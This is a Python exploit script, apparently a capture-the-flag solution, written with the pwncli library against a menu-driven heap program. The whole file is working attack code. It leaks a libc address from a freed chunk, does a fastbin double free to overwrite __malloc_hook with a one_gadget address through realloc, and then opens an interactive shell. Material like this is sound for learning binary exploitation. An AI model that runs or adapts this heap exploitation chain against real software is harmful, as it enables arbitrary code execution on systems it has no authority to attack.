from pwncli import *

cli_script()

p = gift['io']
elf = gift['elf']
if gift['debug']:
    gadget = 0xf1207
    libc = gift['libc']
else:
    gadget = 0xf1147
    libc = ELF("/root/LibcSearcher/libc-database/other_libc_so/libc-2.23.so")


def add(size, name="a",phone="b"):
    p.sendlineafter("Input your choice:", "1")
    p.sendlineafter("Please input the size of girl's name\n", str(size))
    p.sendafter("please inpute her name:\n", name)
    p.sendafter("please input her call:\n", phone)


def show(idx):
    p.sendlineafter("Input your choice:", "2")
    p.sendlineafter("Please input the index:\n", str(idx))
    p.recvuntil("name:\n")
    name = p.recvline()
    p.recvuntil("phone:\n")
    phone = p.recvline()
    info("recv name:{}  phone:{}".format(name, phone))
    return name, phone


def call(idx):
    p.sendlineafter("Input your choice:", "4")
    p.sendlineafter("Please input the index:\n", str(idx))


# fastbin attack
# leak libc addr to get malloc addr
# use one_gadget to get shell

add(0x80)
add(0x60)
add(0x60)

call(0)
name, _= show(0)
leak_libc_addr = u64(name[:-1].ljust(8, b"\x00"))
log_address("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - 0x3c4b78
log_address("libc_base_addr", libc_base_addr)

libc.address = libc_base_addr

call(1)
call(2)
call(1)

add(0x60, p64(libc.sym["__malloc_hook"] - 0x23))
add(0x60)
add(0x60)

# 0x45226 0x4527a 0xf0364 0xf1207

payload = flat(["a" * 11, libc_base_addr + gadget, libc.sym['realloc']+2])

add(0x60, payload)

p.sendlineafter("Input your choice:", "1")

p.interactive()